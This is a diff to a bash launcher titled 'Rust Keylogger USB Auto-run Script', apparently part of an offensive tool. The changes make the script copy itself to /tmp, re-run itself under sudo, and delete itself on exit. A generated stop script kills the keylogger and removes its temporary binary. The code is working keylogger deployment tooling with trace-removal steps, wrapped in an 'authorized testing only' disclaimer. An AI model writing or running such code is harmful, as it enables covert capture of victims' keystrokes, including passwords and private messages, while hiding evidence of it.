@@ -4,6 +4,21 @@
 # ⚠️  WARNING: For Educational and Authorized Security Testing Only!
 # Unauthorized use may be illegal in your jurisdiction.
 
+# Track if we're running from a temp script (passed as second argument)
+IS_TEMP_SCRIPT="$2"
+
+# Cleanup function for temp script (only cleans up the temp script itself, not the binary)
+cleanup_temp_script() {
+    if [ "$IS_TEMP_SCRIPT" = "from_temp" ] && [ -n "$0" ] && [[ "$0" == /tmp/usb_autorun.* ]]; then
+        rm -f "$0" 2>/dev/null
+    fi
+}
+
+# Register cleanup trap only if we're the temp script
+if [ "$IS_TEMP_SCRIPT" = "from_temp" ]; then
+    trap cleanup_temp_script EXIT
+fi
+
 echo "=========================================="
 echo "  Rust Keylogger USB Auto-run Script"
 echo "=========================================="
@@ -42,13 +57,18 @@ if [ "$EUID" -ne 0 ]; then
     TEMP_SCRIPT=$(mktemp /tmp/usb_autorun.XXXXXX.sh)
     cp "$0" "$TEMP_SCRIPT"
     chmod +x "$TEMP_SCRIPT"
-    exec sudo bash "$TEMP_SCRIPT" "$SCRIPT_DIR" "$@"
+    # Pass "from_temp" as second arg to signal temp script cleanup should happen
+    exec sudo bash "$TEMP_SCRIPT" "$SCRIPT_DIR" "from_temp" "$@"
 fi
 
 # If first argument is a directory path, it means we were called from temp script
 if [ -d "$1" ]; then
     SCRIPT_DIR="$1"
     shift
+    # Second arg might be "from_temp" flag, shift it too
+    if [ "$1" = "from_temp" ]; then
+        shift
+    fi
     BINARY_PATH="$SCRIPT_DIR/rust-key"
 fi
 
@@ -148,10 +168,20 @@ echo "⚠️  Remember: Only use this on systems you own or have explicit permis
 echo ""
 
 # Optional: Create a stop script for convenience
+# The stop script also cleans up the temp binary if it exists
 cat > "$SCRIPT_DIR/stop_keylogger.sh" << EOF
 #!/bin/bash
 echo "Stopping keylogger (PID: $KEYLOGGER_PID)..."
-sudo kill $KEYLOGGER_PID 2>/dev/null && echo "✅ Keylogger stopped" || echo "❌ Keylogger not found or already stopped"
+if sudo kill $KEYLOGGER_PID 2>/dev/null; then
+    echo "✅ Keylogger stopped"
+    # Clean up temp binary if it exists
+    if [ -f "$EXEC_PATH" ] && [[ "$EXEC_PATH" == /tmp/rust-key.* ]]; then
+        rm -f "$EXEC_PATH" 2>/dev/null
+        echo "✅ Temporary binary cleaned up"
+    fi
+else
+    echo "❌ Keylogger not found or already stopped"
+fi
 EOF
 
 chmod +x "$SCRIPT_DIR/stop_keylogger.sh" 2>/dev/null || true
